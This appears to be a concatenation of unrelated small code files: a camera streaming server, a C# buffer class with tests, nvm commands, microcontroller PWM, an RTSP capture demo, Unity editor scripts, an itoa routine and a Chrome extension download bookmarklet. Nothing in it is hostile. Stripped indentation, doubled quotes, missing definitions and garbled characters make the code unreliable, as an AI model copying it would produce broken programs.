ERROR_404 = """"""
<html>
  <head>
    <title>404 - Not Found</title>
  </head>
  <body>
    <h1>404 - Not Found</h1>
  </body>
</html>
""""""




class IPCameraApp(object):
 queues = []


 def __call__(self, environ, start_response):    
 if environ['PATH_INFO'] == '/':
 start_response(""200 OK"", [
                (""Content-Type"", ""text/html""),
                (""Content-Length"", str(len(INDEX_PAGE)))
            ])
 return iter([INDEX_PAGE])    
 elif environ['PATH_INFO'] == '/mjpeg_stream':
 return self.stream(start_response)
 else:
 start_response(""404 Not Found"", [
                (""Content-Type"", ""text/html""),
                (""Content-Length"", str(len(ERROR_404)))
            ])
 return iter([ERROR_404])


 def stream(self, start_response):
 start_response('200 OK', [('Content-type', 'multipart/x-mixed-replace; boundary=--spionisto')])
 q = Queue()
 self.queues.append(q)
 while True:
 try:
 yield q.get()
 except:
 if q in self.queues:
 self.queues.remove(q)
 return




def input_loop(app):
 sock = socket()
 sock.bind(('', 9999))
 sock.listen(1)
 while True:
 print 'Waiting for input stream'
 sd, addr = sock.accept()
 print 'Accepted input stream from', addr
 data = True
 while data:
 readable = select([sd], [], [], 0.1)[0]
 for s in readable:
 data = s.recv(1024)
 if not data:
 break
 for q in app.queues:
 q.put(data)
 print 'Lost input stream from', addr


if __name__ == '__main__':


 #Launch an instance of wsgi server
 app = IPCameraApp()
 port = 1337
 print 'Launching camera server on port', port
 httpd = create_server('', port, app)


 print 'Launch input stream thread'
 t1 = Thread(target=input_loop, args=[app])
 t1.setDaemon(True)
 t1.start()


 try:
 print 'Httpd serve forever'
 httpd.serve_forever()
 except KeyboardInterrupt:
 httpd.kill()
 print ""Shutdown camera server ...""
"
"BufferAligner.cs
","using System.IO;


namespace Aligner
{
 public class BufferAligner : IBufferAligner, IDisposable, IAsyncDisposable
 {
 private readonly int _alignSize;
 private MemoryStream _buffer;
 private MemoryStream _swapBuffer;
 
 public BufferAligner(int alignSize)
 {
 _alignSize = alignSize;
 _buffer = new MemoryStream();
 _swapBuffer = new MemoryStream();
 }


 public void Add(Stream stream)
 {
            stream.Seek(offset: 0, SeekOrigin.Begin);
            stream.CopyTo(_buffer);
 }


 public bool IsAligned()
 {
 return _buffer.Length >= _alignSize;
 }


 public bool IsEmpty()
 {
 return _buffer.Length == 0;
 }


 public MemoryStream Flush()
 {
            _buffer.Seek(offset: 0, SeekOrigin.Begin);
 var resultArraySize = _buffer.Length < _alignSize ? (int)_buffer.Length : _alignSize;
 var bytes = new byte[resultArraySize];
 var readCount = _buffer.Read(bytes, offset: 0, count: resultArraySize);
 var result = new MemoryStream(bytes);
            ClearFlushed();
 return result;
 }




 private void ClearStream(MemoryStream source)
 {
 byte[] buffer = source.GetBuffer();
            Array.Clear(buffer, 0, buffer.Length);
            source.Position = 0;
            source.SetLength(0);
 }
 private void ClearFlushed()
 {
            _buffer.CopyTo(_swapBuffer);
            ClearStream(_buffer);
            _swapBuffer.Seek(0, SeekOrigin.Begin);
            _swapBuffer.CopyTo(_buffer);
            ClearStream(_swapBuffer);
 }


 public void Dispose()
 {
            _buffer?.Dispose();
            _swapBuffer?.Dispose();
 }


 public async ValueTask DisposeAsync()
 {
 if (_buffer != null) await _buffer.DisposeAsync();
 if (_swapBuffer != null) await _swapBuffer.DisposeAsync();
 }
 
 
 }


 public interface IBufferAligner: IDisposable, IAsyncDisposable
 {
 void Add(Stream stream);
 bool IsAligned();
 bool IsEmpty();
        MemoryStream Flush();
 }
}
using System;
using System.Collections.Generic;
using System.IO;
using Aligner.ObjectStorage;
using NUnit.Framework;


namespace Aligner.Tests
{
 public class BufferAlignerTests
 {
 private BufferAligner _bufferAligner;
 private const int AlignSize = 9;


 [SetUp]
 public void Setup()
 {
 _bufferAligner = new BufferAligner(AlignSize);
 }


 [TestCase(1, ExpectedResult = false)]
 [TestCase(100, ExpectedResult = false)]
 [TestCase(0, ExpectedResult = true)]
 public bool IsEmpty(int len)
 {
 using var ms = MemoryStreamWithRandomByteArray(len);
            _bufferAligner.Add(ms);
 return _bufferAligner.IsEmpty();
 }


 [TestCase(1, ExpectedResult = false)]
 [TestCase(100, ExpectedResult = true)]
 [TestCase(9, ExpectedResult = true)]
 [TestCase(8, ExpectedResult = false)]
 [TestCase(0, ExpectedResult = false)]
 public bool IsAligned(int len)
 {
 using var ms = MemoryStreamWithRandomByteArray(len);
            _bufferAligner.Add(ms);
 return _bufferAligner.IsAligned();
 }


 [TestCase(100, ExpectedResult = AlignSize)]
 [TestCase(9, ExpectedResult = AlignSize)]
 [TestCase(8, ExpectedResult = 8)]
 [TestCase(1, ExpectedResult = 1)]
 [TestCase(0, ExpectedResult = 0)]
 public long FlushLength(int len)
 {
 using var ms = MemoryStreamWithRandomByteArray(len);
            _bufferAligner.Add(ms);
 using var flushed = _bufferAligner.Flush();
 return flushed.Length;
 }
 
 
 [TestCase(100, ExpectedResult = 12)]
 [TestCase(9, ExpectedResult = 1)]
 [TestCase(8, ExpectedResult = 1)]
 [TestCase(1, ExpectedResult = 1)]
 [TestCase(0, ExpectedResult = 0)]
 public long AlignParts(int len)
 {
 using var ms = MemoryStreamWithRandomByteArray(len);
            _bufferAligner.Add(ms);
 var count = 0;
 while (!_bufferAligner.IsEmpty())
 {
 using var flushed = _bufferAligner.Flush();
 count++;


 }
 return count;
 }
 
 [TestCase(100)]
 [TestCase(9)]
 [TestCase(8)]
 [TestCase(1)]
 [TestCase(0)]
 public void FlushedEqualInitial(int len)
 {
 using var ms = MemoryStreamWithRandomByteArray(len);
 var init = ms.ToArray();


            _bufferAligner.Add(ms);
 var result = new List<byte>(len);
 while (!_bufferAligner.IsEmpty())
 {
 using var flushed = _bufferAligner.Flush();
                result.AddRange(flushed.ToArray());


 }
            Assert.AreEqual(init.Length, result.Count);
 for (int i = 0; i < init.Length; i++)
 {
                Assert.AreEqual(init[i],result[i]);
 }
 }




 private MemoryStream MemoryStreamWithRandomByteArray(int len)
 {
 var bytes = new List<byte>(len);
 var random = new Random();


 for (int i = 0; i < len; i++)
 {
                bytes.Add((byte)random.Next(0, 255));
 }


 var ms = new MemoryStream(bytes.ToArray());
            ms.Seek(0, SeekOrigin.Begin);
 return ms;
 }
 }
}
==<SEPERATOR>==
nvmCommands.js
// check version
node -v || node --version


// list locally installed versions of node
nvm ls


// list remove available versions of node
nvm ls-remote


// install specific version of node
nvm install 18.16.1


// set default version of node
nvm alias default 18.16.1


// switch version of node
nvm use 20.5.1


// install latest LTS version of node (Long Term Support)
nvm install --lts


// install latest stable version of node
nvm install stable
==<SEPERATOR>==
pwm.c
#include ""msp430.h""


/*
  Simple PWM generator using Timer A
  Output P1.0, PWM period about 2 ms
  Duty cycle changes gradually from 5% to 95%

  Compiled with msp430-gcc

  aarmot 2013-01-16
*/


#define PIN		BIT0
#define PERIOD		2000
#define MIN_DUTY	100
#define MAX_DUTY	1900


unsigned int duty = MIN_DUTY;


void main(void)
{
 WDTCTL = WDTPW + WDTHOLD;	// Stop watchdog
 P1DIR |= PIN;			// Output direction
 P1OUT = PIN;			// Out = 1
 TA0CCTL0 = CCIE;		// CCR0 interrupt enabled
 TA0CCR0 = duty;
 TA0CTL = TASSEL_2 + MC_2;	// SMCLK, contmode
 __bis_SR_register(LPM0_bits + GIE);	// Enter LPM0 w/ interrupt
}


__attribute__((__interrupt__(TIMER0_A0_VECTOR)))
void Timer0_A(void)
{
 P1OUT ^= PIN;			// Toggle output
 if(P1OUT & PIN) {
 duty++;
 if(duty > MAX_DUTY) duty = MIN_DUTY;
 TA0CCR0 += duty;
	} else {
 TA0CCR0 += PERIOD - duty;
	}
}
"
"read_parquet.py
","import gcsfs
import pyarrow


def read_parquet(gs_directory_path, to_pandas=True):
 """"""
    Reads multiple (partitioned) parquet files from a GS directory
    e.g. 'gs://<bucket>/<directory>' (without ending /)
    """"""
 gs = gcsfs.GCSFileSystem()
 arrow_df = pyarrow.parquet.ParquetDataset(gs_directory_path, filesystem=gs)
 if to_pandas:
 return arrow_df.read_pandas().to_pandas()
 return arrow_df
 
==<SEPERATOR>==
rtsp-rtp-sample.py
""""""
http://stackoverflow.com/questions/28022432/receiving-rtp-packets-after-rtsp-setup
A demo python code that ..

1) Connects to an IP cam with RTSP
2) Draws RTP/NAL/H264 packets from the camera
3) Writes them to a file that can be read with any stock video player (say, mplayer, vlc & other ffmpeg based video-players)

Done for educative/demonstrative purposes, not for efficiency..!

written 2015 by Sampsa Riikonen.
""""""


import socket
import re
import bitstring # if you don't have this from your linux distro, install with ""pip install bitstring""


# ************************ FOR QUICK-TESTING EDIT THIS AREA *********************************************************
ip=""192.168.1.112"" # IP address of your cam
#adr=""rtsp://admin:888888@192.168.1.112:554/onvif1"" # username, passwd, etc.
adr=""rtsp://192.168.1.112/onvif1"" # username, passwd, etc.
clientports=[60784,60785] # the client ports we are going to use for receiving video
fname=""stream.h264"" # filename for dumping the stream
rn=5000 # receive this many packets
# After running this program, you can try your file defined in fname with ""vlc fname"" or ""mplayer fname"" from the command line
# you might also want to install h264bitstream to analyze your h264 file
# *******************************************************************************************************************


dest=(""DESCRIBE ""+adr+"" RTSP/1.0\r\nCSeq: 0\r\nUser-Agent: python\r\nAccept: application/sdp\r\n\r\n"").encode()
setu=(""SETUP ""+adr+""/track1 RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: python\r\nTransport: RTP/AVP;unicast;client_port=""+str(clientports[0])+""-""+str(clientports[1])+""\r\n\r\n"").encode()
optio=(""OPTIONS ""+adr+"" RTSP/1.0\r\nCSeq: 2\r\nUser-Agent: python\r\n\r\n"").encode()
play=(""PLAY ""+adr+"" RTSP/1.0\r\nCSeq: 3\r\nUser-Agent: python\r\nSession: SESID\r\nRange: npt=0.000-\r\n\r\n"").encode()


# File organized as follows:
# 1) Strings manipulation routines
# 2) RTP stream handling routine
# 3) Main program






# *** (1) First, some string searching/manipulation for handling the rtsp strings ***


def getPorts(searchst,st):
 """""" Searching port numbers from rtsp strings using regular expressions
  """"""
 pat=re.compile(searchst+""=\d*-\d*"")
 pat2=re.compile('\d+')
 mstring=pat.findall(st)[0] # matched string .. ""client_port=1000-1001""
 nums=pat2.findall(mstring)
 numas=[]
 for num in nums:
 numas.append(int(num))
 return numas




def getLength(st):
 """""" Searching ""content-length"" from rtsp strings using regular expressions
  """"""
 pat=re.compile(""Content-Length: \d*"")
 pat2=re.compile('\d+')
 mstring=pat.findall(st)[0] # matched string.. ""Content-Length: 614""
 num=int(pat2.findall(mstring)[0])
 return num




def printrec(recst):
 """""" Pretty-printing rtsp strings
  """"""
 recs=(recst).decode().split('\r\n')
 for rec in recs:
 print(rec)




def sessionid(recst):
 """""" Search session id from rtsp strings
  """"""
 recs=recst.decode().split('\r\n')
 for rec in recs:
 ss=rec.split()
 # print "">"",ss
 if (ss[0].strip()==""Session:""):
 return str(ss[1].split("";"")[0].strip())




def setsesid(recst,idn):
 """""" Sets session id in an rtsp string
  """"""
 return (recst.replace(""SESID"",str(idn))).encode()






# ********* (2) The routine for handling the RTP stream ***********


def digestpacket(st):
 """""" This routine takes a UDP packet, i.e. a string of bytes and ..
  (a) strips off the RTP header
  (b) adds NAL ""stamps"" to the packets, so that they are recognized as NAL's
  (c) Concantenates frames
  (d) Returns a packet that can be written to disk as such and that is recognized by stock media players as h264 stream
  """"""
 startbytes=(""\x00\x00\x00\x01"").encode()# this is the sequence of four bytes that identifies a NAL packet.. must be in front of every NAL packet.
 st=(st.decode(errors='ignore')).encode()
 bt=bitstring.BitArray(bytes=st) # turn the whole string-of-bytes packet into a string of bits.  Very unefficient, but hey, this is only for demoing.
 lc=12 # bytecounter
 bc=12*8 # bitcounter


 version=bt[0:2].uint # version
 p=bt[3] # P
 x=bt[4] # X
 cc=bt[4:8].uint # CC
 m=bt[9] # M
 pt=bt[9:16].uint # PT
 sn=bt[16:32].uint # sequence number
 timestamp=bt[32:64].uint # timestamp
 ssrc=bt[64:96].uint # ssrc identifier
 # The header format can be found from:
 # https://en.wikipedia.org/wiki/Real-time_Transport_Protocol


 lc=12 # so, we have red twelve bytes
 bc=12*8 # .. and that many bits


 print(""version, p, x, cc, m, pt"",version,p,x,cc,m,pt)
 print(""sequence number, timestamp"",sn,timestamp)
 print(""sync. source identifier"",ssrc)


 # st=f.read(4*cc) # csrc identifiers, 32 bits (4 bytes) each
 cids=[]
 for i in range(cc):
 cids.append(bt[bc:bc+32].uint)
 bc+=32
 lc+=4
 print(""csrc identifiers:"",cids)


 if (x):
 # this section haven't been tested.. might fail
 hid=bt[bc:bc+16].uint
 bc+=16
 lc+=2


 hlen=bt[bc:bc+16].uint
 bc+=16
 lc+=2


 print(""ext. header id, header len"",hid,hlen)


 hst=bt[bc:bc+32*hlen]
 bc+=32*hlen
 lc+=4*hlen




 # OK, now we enter the NAL packet, as described here:
 # 
 # https://tools.ietf.org/html/rfc6184#section-1.3
 #
 # Some quotes from that document:
 #
 """"""
  5.3. NAL Unit Header Usage


  The structure and semantics of the NAL unit header were introduced in
  Section 1.3.  For convenience, the format of the NAL unit header is
  reprinted below:

      +---------------+
      |0|1|2|3|4|5|6|7|
      +-+-+-+-+-+-+-+-+
      |F|NRI|  Type   |
      +---------------+

  This section specifies the semantics of F and NRI according to this
  specification.

  """"""
 """"""
  Table 3.  Summary of allowed NAL unit types for each packetization
                mode (yes = allowed, no = disallowed, ig = ignore)

      Payload Packet    Single NAL    Non-Interleaved    Interleaved
      Type    Type      Unit Mode           Mode             Mode
      -------------------------------------------------------------
      0      reserved      ig               ig               ig
      1-23   NAL unit     yes              yes               no
      24     STAP-A        no              yes               no
      25     STAP-B        no               no              yes
      26     MTAP16        no               no              yes
      27     MTAP24        no               no              yes
      28     FU-A          no              yes              yes
      29     FU-B          no               no              yes
      30-31  reserved      ig               ig               ig
  """"""
 # This was also very usefull:
 # http://stackoverflow.com/questions/7665217/how-to-process-raw-udp-packets-so-that-they-can-be-decoded-by-a-decoder-filter-i
 # A quote from that:
 """"""
  First byte:  [ 3 NAL UNIT BITS | 5 FRAGMENT TYPE BITS] 
  Second byte: [ START BIT | RESERVED BIT | END BIT | 5 NAL UNIT BITS] 
  Other bytes: [... VIDEO FRAGMENT DATA...]
  """"""


 fb=bt[bc] # i.e. ""F""
 nri=bt[bc+1:bc+3].uint # ""NRI""
 nlu0=bt[bc:bc+3] # ""3 NAL UNIT BITS"" (i.e. [F | NRI])
 typ=bt[bc+3:bc+8].uint # ""Type""
 print(""F, NRI, Type :"", fb, nri, typ)
 print(""first three bits together :"",bt[bc:bc+3])


 if (typ==7 or typ==8):
 # this means we have either an SPS or a PPS packet
 # they have the meta-info about resolution, etc.
 # more reading for example here:
 # http://www.cardinalpeak.com/blog/the-h-264-sequence-parameter-set/
 if (typ==7):
 print("">>>>> SPS packet"")
 else:
 print("">>>>> PPS packet"")
 return startbytes+st[lc:]
 # .. notice here that we include the NAL starting sequence ""startbytes"" and the ""First byte""


 bc+=8
 lc+=1 # let's go to ""Second byte""
 # ********* WE ARE AT THE ""Second byte"" ************
 # The ""Type"" here is most likely 28, i.e. ""FU-A""
 start=bt[bc] # start bit
 end=bt[bc+2] # end bit
 nlu1=bt[bc+3:bc+8] # 5 nal unit bits


 if (start): # OK, this is a first fragment in a movie frame
 print("">>> first fragment found"")
 nlu=nlu0+nlu1 # Create ""[3 NAL UNIT BITS | 5 NAL UNIT BITS]""
 head=startbytes+nlu.bytes # .. add the NAL starting sequence
 lc+=1 # We skip the ""Second byte""
 if (start==False and end==False): # intermediate fragment in a sequence, just dump ""VIDEO FRAGMENT DATA""
 head=""""
 lc+=1 # We skip the ""Second byte""
 elif (end==True): # last fragment in a sequence, just dump ""VIDEO FRAGMENT DATA""
 head=""""
 print(""<<<< last fragment found"")
 lc+=1 # We skip the ""Second byte""


 if (typ==28): # This code only handles ""Type"" = 28, i.e. ""FU-A""
 return head+st[lc:]
 else:
 print(""unknown frame type for this piece of s***"")
 #raise(Exception,""unknown frame type for this piece of s***"")






# *********** (3) THE MAIN PROGRAM STARTS HERE ****************


# Create an TCP socket for RTSP communication
# further reading: 
# https://docs.python.org/2.7/howto/sockets.html
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,554)) # RTSP should peek out from port 554


print()
print(""*** SENDING DESCRIBE ***"")
print()
print(dest.decode())
s.send(dest)
recst=s.recv(4096)
print()
print(""*** GOT ****"")
print()
printrec(recst)


print()
print(""*** SENDING OPTIONS ***"")
print()
print(optio.decode())
s.send(optio)
recst=s.recv(4096)
print()
print(""*** GOT ****"")
print()
printrec(recst)


print()
print(""*** SENDING SETUP ***"")
print()
print(setu.decode())
s.send(setu)
recst=s.recv(4096)
print()
print(""*** GOT ****"")
print()
printrec(recst)
idn=sessionid(recst)


serverports=getPorts(""server_port"",recst.decode())
clientports=getPorts(""client_port"",recst.decode())
print(""****"")
print(""ip,serverports"",ip,serverports)
print(""****"")


s1=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s1.bind(("""", clientports[0])) # we open a port that is visible to the whole internet (the empty string """" takes care of that)
s1.settimeout(5) # if the socket is dead for 5 s., its thrown into trash
# further reading:
# https://wiki.python.org/moin/UdpCommunication


# Now our port is open for receiving shitloads of videodata.  Give the camera the PLAY command..
print()
print(""*** SENDING PLAY ***"")
print()
play=setsesid(play.decode(),idn)
s.send(play)
recst=s.recv(4096)
print()
print(""*** GOT ****"")
print()
printrec(recst)
print()
print()
print(""** STRIPPING RTP INFO AND DUMPING INTO FILE **"")
f=open(fname,'w')
for i in range(rn):
 print()
 print()
 recst=s1.recv(4096)
 print(""read"",len(recst),""bytes"")
 st=digestpacket(recst)
 print(""dumping"",len(st),""bytes"")
 f.write(st)
f.close()


# Before closing the sockets, we should give the ""TEARDOWN"" command via RTSP, but I am feeling lazy today (after googling, wireshark-analyzing, among other-things).
s.close()
s1.close()
"
"ConvertLiftGammaGain.cs
","// URP has a tool to convert postprocessing volumes but it doesn't transform the coefficients so the visuals won't look the same
// This does the transformation to make them match.


private static void ConvertLiftGammaGainValues( VolumeProfile profile )
{
 if( profile != null && profile.TryGet( out LiftGammaGain lgg ) && lgg.active )
 {
 if( lgg.lift.overrideState )
 {
      lgg.lift.value = new Vector4( Mathf.LinearToGammaSpace( lgg.lift.value.x * 0.2f / 0.15f ),
        Mathf.LinearToGammaSpace( lgg.lift.value.y * 0.2f / 0.15f ) ,
        Mathf.LinearToGammaSpace( lgg.lift.value.z * 0.2f / 0.15f ) ,
        lgg.lift.value.w * 0.2f );
 }


 if( lgg.gamma.overrideState )
 {
      lgg.gamma.value = new Vector4( Mathf.LinearToGammaSpace( lgg.gamma.value.x ),
        Mathf.LinearToGammaSpace( lgg.gamma.value.y ),
        Mathf.LinearToGammaSpace( lgg.gamma.value.z ), 
        lgg.gamma.value.w * 0.8f ); 
 }


 if( lgg.gain.overrideState )
 {
      lgg.gain.value = new Vector4( Mathf.LinearToGammaSpace( lgg.gain.value.x ),
        Mathf.LinearToGammaSpace( lgg.gain.value.y ),
        Mathf.LinearToGammaSpace( lgg.gain.value.z ), 
        lgg.gain.value.w * 0.8f );
 }
 }
}
"
"Itoa.c
","#include <stdio.h>
#include <stdlib.h>


typedef enum{false, true} bool;


void swap(char *a, char *b)                                                                                                                                                                       
  {
 if(!a || !b)
 return;


 char temp = *(a);
 *(a) = *(b);
 *(b) = temp;
   }


void reverse(char *str, int length) 
{ 
 int start = 0; 
 int end = length -1; 
 while (start < end) 
	{ 
 swap((str+start), (str+end)); 
 start++; 
 end--; 
	} 
} 


char* itoa(int num, char* str, int base) 
{ 
 int i = 0; 
 bool isNegative = false; 


 if (num == 0) 
	{ 
 str[i++] = '0'; 
 str[i] = '\0'; 
 return str; 
	}


 if (num < 0 && base == 10) 
	{ 
 isNegative = true;
 num = -num; 
	} 


 while (num != 0) 
	{ 
 int rem = num % base; 
 str[i++] = (rem > 9)? (rem-10) + 'a' : rem + '0'; 
 num = num/base; 
	}


 if (isNegative == true) 
 str[i++] = '-'; 


 str[i] = '\0';
 reverse(str, i); 
 return str; 
} 
==<SEPERATOR>==
CrxDownload.js
// Triple-click the 4th line, then drag & drop it to your bookmark bar




javascript:(()=>{const a=location.pathname.match(/(?<=\/)[a-z]{32}(?=\/|$)(?!\/+[a-z]{32}(?=\/|$))/)?.[0];a&&location.assign(""https://clients2.google.com/service/update2/crx?response=redirect&prodversion=9999.0.9999.0&acceptformat=crx2,crx3&x=id%253D""+a+""%2526uc"")})()




// Triple-click 4th line, then drag & drop to your bookmark bar
"
"msword_matrix.py
","# you should install numpy package with `pip install numpy` command
import numpy as np


def OUTPUT(arr, transpose=False, decimals=8):
 # 2D array is not need [1] so we should check the dimension
 if np.asarray(arr).ndim == 1:
 # 1D array can't get transpose if we not add '[]' at before and after array's variable. Reference: [1]
 arr = np.asarray([arr])
 else:
 # 2D array is fine, not like [1]
 arr = np.asarray(arr)
 
 if transpose:
 # thanks to [1] so we can also transpose 1D, not just 2D
 arr = arr.T
 
 # round the number to @param decimals
 arr = np.around(arr, decimals=decimals)
 
 row_num = arr.shape[0]
 col_num = arr.shape[1]


 if (col_num == 1):
 result = '[��('
 result += '@'.join([str(arr[row][0]) for row in range(row_num)])
 result += ')]'
 elif (row_num == 1):
 result = '[��('
 result += '&'.join([str(arr[0][col]) for col in range(col_num)])
 result += ')]'
 else:
 result = '[��('
 result += '@'.join(['&'.join([str(arr[row, col]) for col in range(col_num)]) for row in range(row_num)])
 result += ')]'
 
 print(result)


# EXAMPLE USAGE
OUTPUT(
    [0.0015875153895135195, 0.7887987865331551718],
 transpose=False,
 decimals=8 # round to 8 decimals
)


# Output: [��(0.00158752&0.78879879)]
"
"ExtendedScriptableObjectDrawer.cs
","// Developed by Tom Kail at Inkle
// Released under the MIT Licence as held at https://opensource.org/licenses/MIT


// Must be placed within a folder named ""Editor""
using System;
using System.Reflection;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEditor;
using Object = UnityEngine.Object;


/// <summary>
/// Extends how ScriptableObject object references are displayed in the inspector
/// Shows you all values under the object reference
/// Also provides a button to create a new ScriptableObject if property is null.
/// </summary>
[CustomPropertyDrawer(typeof(ScriptableObject), true)]
public class ExtendedScriptableObjectDrawer : PropertyDrawer {
 
 public override float GetPropertyHeight (SerializedProperty property, GUIContent label) {
 float totalHeight = EditorGUIUtility.singleLineHeight;
 if(property.objectReferenceValue == null || !AreAnySubPropertiesVisible(property)){
 return totalHeight;
 }
 if(property.isExpanded) {
 var data = property.objectReferenceValue as ScriptableObject;
 if( data == null ) return EditorGUIUtility.singleLineHeight;
 SerializedObject serializedObject = new SerializedObject(data);
 SerializedProperty prop = serializedObject.GetIterator();
 if (prop.NextVisible(true)) {
 do {
 if(prop.name == ""m_Script"") continue;
 var subProp = serializedObject.FindProperty(prop.name);
 float height = EditorGUI.GetPropertyHeight(subProp, null, true) + EditorGUIUtility.standardVerticalSpacing;
 totalHeight += height;
 }
 while (prop.NextVisible(false));
 }
 // Add a tiny bit of height if open for the background
 totalHeight += EditorGUIUtility.standardVerticalSpacing;
			serializedObject.Dispose();
 }
 return totalHeight;
 }


 const int buttonWidth = 66;
 
 static readonly List<string> ignoreClassFullNames = new List<string>{ ""TMPro.TMP_FontAsset"" };
 
 public override void OnGUI (Rect position, SerializedProperty property, GUIContent label) {
		EditorGUI.BeginProperty (position, label, property);
 var type = GetFieldType();
 
 if(type == null || ignoreClassFullNames.Contains(type.FullName)) {
			EditorGUI.PropertyField(position, property, label); 
			EditorGUI.EndProperty ();
 return;
 }
 
 ScriptableObject propertySO = null;
 if(!property.hasMultipleDifferentValues && property.serializedObject.targetObject != null && property.serializedObject.targetObject is ScriptableObject) {
 propertySO = (ScriptableObject)property.serializedObject.targetObject;
 }
 
 var propertyRect = Rect.zero;
 var guiContent = new GUIContent(property.displayName);
 var foldoutRect = new Rect(position.x, position.y, EditorGUIUtility.labelWidth, EditorGUIUtility.singleLineHeight);
 if(property.objectReferenceValue != null && AreAnySubPropertiesVisible(property)) {
			property.isExpanded = EditorGUI.Foldout(foldoutRect, property.isExpanded, guiContent, true);
 } else {
 // So yeah having a foldout look like a label is a weird hack 
 // but both code paths seem to need to be a foldout or 
 // the object field control goes weird when the codepath changes.
 // I guess because foldout is an interactable control of its own and throws off the controlID?
			foldoutRect.x += 12;
			EditorGUI.Foldout(foldoutRect, property.isExpanded, guiContent, true, EditorStyles.label);
 }
 var indentedPosition = EditorGUI.IndentedRect(position);
 var indentOffset = indentedPosition.x - position.x;
 propertyRect = new Rect(position.x + (EditorGUIUtility.labelWidth - indentOffset), position.y, position.width - (EditorGUIUtility.labelWidth - indentOffset), EditorGUIUtility.singleLineHeight);


 if(propertySO != null || property.objectReferenceValue == null) {
			propertyRect.width -= buttonWidth;
 }
 
		EditorGUI.ObjectField(propertyRect, property, type, GUIContent.none);
 if (GUI.changed) property.serializedObject.ApplyModifiedProperties();


 var buttonRect = new Rect(position.x + position.width - buttonWidth, position.y, buttonWidth, EditorGUIUtility.singleLineHeight);
 
 if(property.propertyType == SerializedPropertyType.ObjectReference && property.objectReferenceValue != null) {
 var data = (ScriptableObject)property.objectReferenceValue;
 
 if(property.isExpanded) {
 // Draw a background that shows us clearly which fields are part of the ScriptableObject
				GUI.Box(new Rect(0, position.y + EditorGUIUtility.singleLineHeight + EditorGUIUtility.standardVerticalSpacing - 1, Screen.width, position.height - EditorGUIUtility.singleLineHeight - EditorGUIUtility.standardVerticalSpacing), """");


				EditorGUI.indentLevel++;
 SerializedObject serializedObject = new SerializedObject(data);
 
 // Iterate over all the values and draw them
 SerializedProperty prop = serializedObject.GetIterator();
 float y = position.y + EditorGUIUtility.singleLineHeight + EditorGUIUtility.standardVerticalSpacing;
 if (prop.NextVisible(true)) {
 do {
 // Don't bother drawing the class file
 if(prop.name == ""m_Script"") continue;
 float height = EditorGUI.GetPropertyHeight(prop, new GUIContent(prop.displayName), true);
						EditorGUI.PropertyField(new Rect(position.x, y, position.width-buttonWidth, height), prop, true);
 y += height + EditorGUIUtility.standardVerticalSpacing;
 }
 while (prop.NextVisible(false));
 }
 if (GUI.changed)
					serializedObject.ApplyModifiedProperties();
				serializedObject.Dispose();
				EditorGUI.indentLevel--;
 }
 } else {
 if(GUI.Button(buttonRect, ""Create"")) {
 string selectedAssetPath = ""Assets"";
 if(property.serializedObject.targetObject is MonoBehaviour) {
 MonoScript ms = MonoScript.FromMonoBehaviour((MonoBehaviour)property.serializedObject.targetObject);
 selectedAssetPath = System.IO.Path.GetDirectoryName(AssetDatabase.GetAssetPath( ms ));
 }
 
				property.objectReferenceValue = CreateAssetWithSavePrompt(type, selectedAssetPath);
 }
 }
		property.serializedObject.ApplyModifiedProperties();
		EditorGUI.EndProperty ();
 }


 public static T _GUILayout<T> (string label, T objectReferenceValue, ref bool isExpanded) where T : ScriptableObject {
 return _GUILayout<T>(new GUIContent(label), objectReferenceValue, ref isExpanded);
 }
 
 public static T _GUILayout<T> (GUIContent label, T objectReferenceValue, ref bool isExpanded) where T : ScriptableObject {
 Rect position = EditorGUILayout.BeginVertical();
 
 var propertyRect = Rect.zero;
 var guiContent = label;
 var foldoutRect = new Rect(position.x, position.y, EditorGUIUtility.labelWidth, EditorGUIUtility.singleLineHeight);
 if(objectReferenceValue != null) {
 isExpanded = EditorGUI.Foldout(foldoutRect, isExpanded, guiContent, true);


 var indentedPosition = EditorGUI.IndentedRect(position);
 var indentOffset = indentedPosition.x - position.x;
 propertyRect = new Rect(position.x + EditorGUIUtility.labelWidth - indentOffset, position.y, position.width - EditorGUIUtility.labelWidth - indentOffset, EditorGUIUtility.singleLineHeight);
 } else {
 // So yeah having a foldout look like a label is a weird hack 
 // but both code paths seem to need to be a foldout or 
 // the object field control goes weird when the codepath changes.
 // I guess because foldout is an interactable control of its own and throws off the controlID?
			foldoutRect.x += 12;
			EditorGUI.Foldout(foldoutRect, isExpanded, guiContent, true, EditorStyles.label);


 var indentedPosition = EditorGUI.IndentedRect(position);
 var indentOffset = indentedPosition.x - position.x;
 propertyRect = new Rect(position.x + EditorGUIUtility.labelWidth - indentOffset, position.y, position.width - EditorGUIUtility.labelWidth - indentOffset-60, EditorGUIUtility.singleLineHeight);
 }


		EditorGUILayout.BeginHorizontal();
 objectReferenceValue = EditorGUILayout.ObjectField(new GUIContent("" ""), objectReferenceValue, typeof(T), false) as T;


 if(objectReferenceValue != null) {
 
			EditorGUILayout.EndHorizontal();
 if(isExpanded) {
				DrawScriptableObjectChildFields(objectReferenceValue);
 }
 } else {
 if(GUILayout.Button(""Create"", GUILayout.Width(buttonWidth))) {
 string selectedAssetPath = ""Assets"";
 var newAsset = CreateAssetWithSavePrompt(typeof(T), selectedAssetPath);
 if(newAsset != null) {
 objectReferenceValue = (T)newAsset;
 }
 }
			EditorGUILayout.EndHorizontal();
 }
		EditorGUILayout.EndVertical();
 return objectReferenceValue;
 }


 static void DrawScriptableObjectChildFields<T> (T objectReferenceValue) where T : ScriptableObject {
 // Draw a background that shows us clearly which fields are part of the ScriptableObject
		EditorGUI.indentLevel++;
		EditorGUILayout.BeginVertical(GUI.skin.box);


 var serializedObject = new SerializedObject(objectReferenceValue);
 // Iterate over all the values and draw them
 SerializedProperty prop = serializedObject.GetIterator();
 if (prop.NextVisible(true)) {
 do {
 // Don't bother drawing the class file
 if(prop.name == ""m_Script"") continue;
				EditorGUILayout.PropertyField(prop, true);
 }
 while (prop.NextVisible(false));
 }
 if (GUI.changed)
			serializedObject.ApplyModifiedProperties();
		serializedObject.Dispose();
		EditorGUILayout.EndVertical();
		EditorGUI.indentLevel--;
 }


 public static T DrawScriptableObjectField<T> (GUIContent label, T objectReferenceValue, ref bool isExpanded) where T : ScriptableObject {
 Rect position = EditorGUILayout.BeginVertical();
 
 var propertyRect = Rect.zero;
